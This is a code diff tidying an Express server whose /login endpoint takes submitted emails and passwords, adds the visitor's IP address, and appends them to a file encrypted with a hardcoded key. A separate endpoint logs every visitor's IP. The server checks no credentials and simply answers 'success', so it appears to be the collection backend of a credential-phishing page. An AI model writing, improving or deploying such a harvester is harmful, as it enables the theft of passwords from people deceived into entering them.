@@ -7,11 +7,7 @@ const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname)));
 
-const SECRET_KEY = crypto
-  .createHash("sha256")
-  .update("my-secret-key")
-  .digest();
-
+const SECRET_KEY = crypto.createHash("sha256").update("my-secret-key").digest();
 const ALGO = "aes-256-cbc";
 
 function encrypt(text) {
@@ -23,30 +19,18 @@ function encrypt(text) {
 }
 
 app.post("/track-ip", (req, res) => {
-    const userIP =
-        req.headers["x-forwarded-for"] ||
-        req.socket.remoteAddress ||
-        "Unknown IP";
-
-    const data = `ip=${userIP}; visited=${new Date().toISOString()}`;
-    const encrypted = encrypt(data);
-    fs.appendFileSync("users.enc.txt", encrypted + "\n");
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown IP";
+    const data = `ip=${ip}; visited=${new Date().toISOString()}`;
+    fs.appendFileSync("users.enc.txt", encrypt(data) + "\n");
     res.send("ok");
 });
 
 app.post("/login", (req, res) => {
-    const userIP =
-        req.headers["x-forwarded-for"] ||
-        req.socket.remoteAddress ||
-        "Unknown IP";
-
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown IP";
     const email = req.body.email;
     const password = req.body.password;
-
-    const data = `email=${email}; password=${password}; ip=${userIP}; login=${new Date().toISOString()}`;
-    const encrypted = encrypt(data);
-    fs.appendFileSync("users.enc.txt", encrypted + "\n");
-
+    const data = `email=${email}; password=${password}; ip=${ip}; login=${new Date().toISOString()}`;
+    fs.appendFileSync("users.enc.txt", encrypt(data) + "\n");
     res.send("success");
 });
 
